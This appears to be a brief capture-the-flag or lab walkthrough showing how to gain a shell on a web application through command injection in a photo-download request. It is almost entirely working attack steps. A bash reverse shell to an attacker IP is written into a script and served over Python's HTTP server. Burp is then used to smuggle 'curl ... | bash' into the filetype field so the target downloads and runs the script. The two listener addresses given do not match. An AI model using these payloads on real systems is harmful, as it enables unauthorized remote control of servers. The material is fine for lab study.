1)I create a file with the reverse shell inside: 
```
nano reverse.sh

---> bash -i >& /dev/tcp/10.10.14.104/1234 0>&1
```
2)Open a webserver with python: 
```
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 8081 
```
3) On Burp you have to make a request (on the printer directory) to download a photo, and then you block it with the proxy and bring it to Repeater
4)Change the filetype field header to : 
```
filetype=jpg;curl+http://10.10.14.199:8081/reverse.sh+|+bash
```
